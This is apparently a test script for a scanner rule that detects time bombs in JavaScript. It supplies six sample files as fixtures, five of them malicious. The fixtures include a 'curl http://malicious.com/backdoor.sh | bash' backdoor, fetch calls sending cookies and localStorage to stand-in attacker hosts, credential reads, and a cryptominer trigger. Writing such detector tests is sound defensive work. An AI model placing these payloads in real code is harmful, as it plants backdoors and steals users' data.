const rule13_time_bomb = require("../services/rule13_time_bomb");

// Test 1: Clean code with no time bombs
const test1 = {
    files: [
        {
            path: "index.js",
            content: `
                const express = require('express');
                const app = express();
                
                // Normal setTimeout usage
                setTimeout(() => {
                    console.log('Hello after 1 second');
                }, 1000);
                
                // Normal date usage
                const today = new Date();
                console.log('Today is:', today.toISOString());
                
                app.listen(3000);
            `
        }
    ]
};

// Test 2: Explicit time bomb with future date
const test2 = {
    files: [
        {
            path: "malware.js",
            content: `
                // Innocent-looking code that activates later
                function initialize() {
                    console.log('System initialized');
                }
                
                // Time bomb: activates on March 15, 2025
                const activationDate = new Date('2025-03-15').getTime();
                
                function checkActivation() {
                    if (Date.now() > activationDate) {
                        // Malicious payload activates
                        stealCredentials();
                        deployBackdoor();
                        console.log('Time bomb activated!');
                    }
                }
                
                // Check every hour
                setInterval(checkActivation, 60 * 60 * 1000);
                
                function stealCredentials() {
                    // Malicious code here
                    return process.env.SECRET_KEY;
                }
                
                function deployBackdoor() {
                    // More malicious code
                    require('child_process').exec('curl http://malicious.com/backdoor.sh | bash');
                }
            `
        }
    ]
};

// Test 3: Time bomb with Unix timestamp
const test3 = {
    files: [
        {
            path: "payload.js",
            content: `
                // Using Unix timestamp directly
                const EXPLOIT_TIMESTAMP = 1741968000000; // March 15, 2025
                
                module.exports = function() {
                    if (new Date().getTime() >= EXPLOIT_TIMESTAMP) {
                        // Execute malicious payload
                        executeMalware();
                    } else {
                        // Behave normally
                        console.log('Waiting for activation...');
                    }
                };
                
                function executeMalware() {
                    // Cryptominer or other payload
                    require('coinhive').start('site-key');
                }
            `
        }
    ]
};

// Test 4: Delayed activation with long setTimeout
const test4 = {
    files: [
        {
            path: "delayed.js",
            content: `
                // Delayed activation after 60 days
                setTimeout(() => {
                    // This runs 60 days after installation
                    fetch('http://malicious.com/collect', {
                        method: 'POST',
                        body: JSON.stringify(collectData())
                    });
                }, 60 * 24 * 60 * 60 * 1000); // 60 days in milliseconds
                
                function collectData() {
                    // Collect sensitive data
                    return {
                        cookies: document.cookie,
                        localStorage: JSON.stringify(localStorage),
                        userAgent: navigator.userAgent
                    };
                }
            `
        }
    ]
};

// Test 5: Complex conditional with arithmetic
const test5 = {
    files: [
        {
            path: "complex-bomb.js",
            content: `
                // More sophisticated time bomb
                const INSTALL_TIME = Date.now();
                const ACTIVATION_DELAY = 30 * 24 * 60 * 60 * 1000; // 30 days
                
                function shouldActivate() {
                    // Check if 30 days have passed since installation
                    return Date.now() > (INSTALL_TIME + ACTIVATION_DELAY);
                }
                
                // Scheduled task using cron-like pattern
                const cron = require('node-cron');
                cron.schedule('0 0 * * *', () => { // Run daily at midnight
                    if (shouldActivate()) {
                        unleashPayload();
                    }
                });
                
                function unleashPayload() {
                    // Malicious activities
                    const payload = require('./encrypted-payload');
                    payload.execute();
                }
            `
        }
    ]
};

// Test 6: Past activation date (recently triggered)
const test6 = {
    files: [
        {
            path: "recent.js",
            content: `
                // Time bomb that activated 3 days ago
                if (Date.now() > new Date('2026-02-01').getTime()) {
                    // Already activated malware
                    sendStolenData();
                }
                
                function sendStolenData() {
                    // Exfiltrate data
                    const data = gatherSensitiveInfo();
                    fetch('http://attacker.com/exfil', {
                        method: 'POST',
                        body: data
                    });
                }
            `
        }
    ]
};

console.log("Test 1: Clean code with normal timers");
console.log(JSON.stringify(rule13_time_bomb(test1), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 2: Explicit time bomb with future date");
console.log(JSON.stringify(rule13_time_bomb(test2), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 3: Time bomb with Unix timestamp");
console.log(JSON.stringify(rule13_time_bomb(test3), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 4: Delayed activation with long setTimeout");
console.log(JSON.stringify(rule13_time_bomb(test4), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 5: Complex conditional with arithmetic");
console.log(JSON.stringify(rule13_time_bomb(test5), null, 2));
console.log("\n" + "=".repeat(80) + "\n");

console.log("Test 6: Past activation date (recently triggered)");
console.log(JSON.stringify(rule13_time_bomb(test6), null, 2));